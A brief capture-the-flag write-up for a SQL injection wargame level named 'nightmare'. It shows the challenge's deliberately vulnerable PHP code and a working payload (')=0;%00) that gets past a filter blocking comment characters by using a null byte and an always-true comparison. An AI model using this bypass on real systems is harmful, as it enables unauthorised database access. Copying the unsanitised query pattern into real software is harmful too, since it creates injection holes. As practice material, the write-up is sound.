# NIGHTMARE 
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```
-- - and # are blocked for commenting out the rest part of the query.Using ')=0 which is always true because 0=0 is always true.
pw=')=0;%00 '%00' for commenting out .
***
### query : select id from prob_nightmare where pw=('')=0;') and id!='admin'
***
